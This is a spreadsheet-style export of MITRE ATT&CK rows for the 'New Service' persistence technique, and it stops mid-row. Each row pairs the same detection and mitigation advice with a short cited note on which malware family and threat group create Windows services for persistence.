953,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0142|StreamEx]] establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: StreamEx,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
954,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0071|hcdLoader]] installs itself as a service for persistence.[[CiteRef::Dell Lateral Movement]][[CiteRef::ThreatStream Evasion Analysis]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: hcdLoader,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
955,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0004|TinyZBot]] can install as a Windows service for persistence.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: TinyZBot,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
956,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0044|JHUHUGIT]] has registered itself as a service to establish persistence.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: JHUHUGIT, Seduploader, ...","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
957,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can be added as a service to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::FireEye APT10 April 2017]]'],['DragonOK'],['DragonOK'],['G0017'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
958,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0081|Elise]] configures itself as a service.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Elise, BKDR_ESILE, Page","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
959,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0082|Emissary]] is capable of configuring itself as a service.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Emissary,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
960,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0141|Winnti]] sets its DLL file as a new service in the Registry to establish persistence.[[CiteRef::Microsoft Winnti Jan 2017]]'],['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Winnti,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
961,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['One variant of [[Software/S0089|BlackEnergy]] creates a new service using either a hard-coded or randomly generated name.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: BlackEnergy, Black Energy","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
962,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0118|Nidiran]] can create a new service named msamger (Microsoft Security Accounts Manager).[[CiteRef::Symantec Backdoor.Nidiran]]'],['Suckfly'],['Suckfly'],['G0039'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Nidiran, Backdoor.Nidiran","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
963,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0086|ZLib]] creates Registry keys to allow itself to run as various services.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: ZLib,"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
964,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['One persistence mechanism used by [[Software/S0046|CozyCar]] is to register itself as a Windows service.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CozyCar, CozyDuke, ...","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
965,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['[[Software/S0050|CosmicDuke]] uses Windows services typically named ""javamtsup"" for persistence.[[CiteRef::F-Secure Cosmicduke]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CosmicDuke, TinyBaron, ...","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
966,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['Several [[Group/G0032|Lazarus Group]] malware families install themselves as new services on victims.[[CiteRef::Novetta Blockbuster Destructive Malware]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
967,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can be added as a service to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::FireEye APT10 April 2017]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
968,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can be added as a service to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 